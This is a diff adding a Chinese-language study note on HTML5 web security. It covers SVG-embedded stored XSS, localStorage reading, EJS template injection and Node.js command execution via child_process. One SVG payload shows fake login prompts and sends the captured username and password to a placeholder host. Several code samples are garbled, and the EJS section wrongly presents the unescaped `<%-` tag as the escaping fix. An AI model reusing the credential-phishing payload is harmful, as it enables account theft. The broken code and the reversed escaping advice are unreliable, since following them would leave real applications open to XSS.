@@ -1,0 +1,134 @@
+# HTML5
+
+## 新标签
+
+- 像`<header>`,`<footer>`,`<nav>`,`<section>`,`<aside>`等等，使得阅读者更加容易去访问内容。
+- HTML5中最酷的特性就是本地存储。
+- HTML添加了基于SVG、Canvas、WebGL及CSS3的3D功能，可以在浏览器中呈现更好的视觉效果。
+
+## svg
+
+``` javascript
+<?xml version="1.0" standalone="no"?>
+<svg width="1008" height="100" version="1.1" xmlns="http://www.w3.org/2000/svg">
+    <rect width-"100" height="100" style="fill:rgb(0,0,255);stroke-width:1;stroke:rgb(0,0,0)"/>
+</svg>
+```
+
+通过在svg中潜入JS代码可以进行XSS攻击
+
+``` javascript
+<?xml version="1.0" standalone="no"?>
+<svg version="1.1" xmlns="http:/www.w3.org/2000/svg">
+<rect width="100" height="100"/>
+<script>
+    var isChromium = window. chrome,
+    vendorName = window.navigator. vendor,
+    isOpera = window.navigator.userAgent.indexOf("OPR") > -1
+    if(isChromium !== null &amp;&amp; isChromium !== undefined &amp;&amp; vendorName === "Google Inc." &amp;&amp; isOpera = false)
+    ar user = prompt("检测到您正在访问限制内容，请输入您的帐户以登陆帐号")；
+    var pass = prompt("请输您的密码")；
+    window.location = "http: /www.example.com?user=" + user + "&amp;pass=" + pass;
+</script>
+</svg>
+```
+
+如果把这个svg上传到服务器，就会形成存储型XSS攻击
+
+## Web Storage
+
+Web Storage包含两个部分, 一部分是 sessionStorage, 另一部分是 localStorage。
+
+``` javascript
+<svg versiona"1.1"xmlns"http:l/www,w3.orrz2000/syg">
+    <rect width="100" height="100" />
+    <script>
+        if(localstorage. length)
+        for(key in localstorage)
+        if(localStorage.getItem(key))
+        console.log(key);
+        console.log(localStorage.getItem(key));
+    </script>
+</svg>
+```
+
+## CROS
+
+通过HTTP头携带的信息，无CROS信息会被浏览器阻止掉。
+
+## NodeJs的模版注入
+
+### 模版引擎
+
+模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易
+
+### 模板注入
+
+服务端接受用户的输入，并将其作为Web应用模板的一部分，即允许修改底层模板，在渲染过程中模板引擎执行用户插入的恶意内容。
+
+这可以在wiki,WSYWIG或电子邮件模板中恶意使用。这种情况很少发生在无意中，所以它经常被误解为只是XSS。
+
+以EJS为例子
+
+``` html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Input Page</title>
+</head>
+<body>
+    <h1>Enter your input</h1>
+    <form action="/submit" method="POST">
+        <input type="text" name="userInput">
+        <button type="submit">Submit</button>
+    </form>
+</body>
+</html>
+```
+
+display.ejs:
+
+``` html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Display Page</title>
+</head>
+<body>
+    <h1>Display User Input</h1>
+    <p>User Input: <%= userInput %></p>
+</body>
+</html>
+```
+
+在 display.ejs 中，`<%= userInput %>` 直接输出了用户的输入，而没有进行转义。这可能导致用户输入 HTML 或 JavaScript 代码被执行。例如，用户可以输入以下内容来触发XSS攻击：
+
+``` javascript
+<p>User Input: <%- userInput %></p>
+```
+
+将 display.ejs 中的 `<%= userInput %>` 替换为 `<%- userInput %>` 或使用 `escape()` 方法，这会对特殊字符进行编码，从而防止脚本被执行。例如：
+
+``` javascript
+<p>User Input: <%- userInput %></p>
+```
+
+推测后端模版引擎的代码结构，然后精心构造JS代码
+
+## RCE（远程代码执行）
+
+在nodejs中，如果出现了XSS漏洞，容易出现RCE漏洞
+
+获得shell执行，我们必须找到正确的函数来在Node/JavaScript中执行。
+
+JavaScript中有一个特殊的对象，称为全局对象(GlobalObject),它及其所有属性都可以在程序的任何地方访问，即全局变量。
+
+在浏览器JavaScript中，通常window是全局对象，而Node.js中的全局对象是global,所有全局变量（除了global本身以外）都是global对象的属性。
+
+### shell执行
+
+希望最终使用Require函数导入child_process.exec以运行操作系统命令。
